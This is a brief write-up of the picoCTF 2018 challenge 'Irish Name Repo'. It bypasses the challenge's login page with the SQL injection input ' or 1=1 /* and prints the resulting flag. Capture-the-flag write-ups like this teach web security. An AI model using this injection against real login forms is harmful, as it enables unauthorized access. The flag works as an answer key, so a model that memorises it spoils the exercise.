# Irish Name Repo - Points: 200

1. First, lets go through the website : http://2018shell.picoctf.com:59464/
2. Then, we find that there is a login page. The first thing I think about is sql injection, so I input : 
    ```
    username : ' or 1=1 /*
    password : 123
    ```
    And I get the flag.
3. Here is the flag : picoCTF{con4n_r3411y_1snt_1r1sh_d121ca0b}
